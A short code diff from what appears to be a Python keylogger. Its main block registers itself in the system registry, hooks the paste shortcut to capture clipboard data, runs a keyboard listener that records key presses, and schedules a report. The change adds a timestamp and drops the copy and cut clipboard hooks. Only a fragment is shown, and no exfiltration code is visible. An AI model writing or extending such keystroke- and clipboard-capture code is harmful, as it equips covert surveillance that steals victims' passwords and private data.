@@ -164,9 +164,8 @@ def schedule_report():
 if __name__ == "__main__":
     add_to_registry()
     start_time = datetime.now()
+    end_time = datetime.now().strftime('%d/%m/%Y %H:%M')
     keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
-    keyboard.add_hotkey("ctrl+c", copy_clipboard_data, suppress=False)
-    keyboard.add_hotkey("ctrl+x", copy_clipboard_data, suppress=False)
     with kb.Listener(on_press=on_press) as listener:
         schedule_report()
         listener.join()
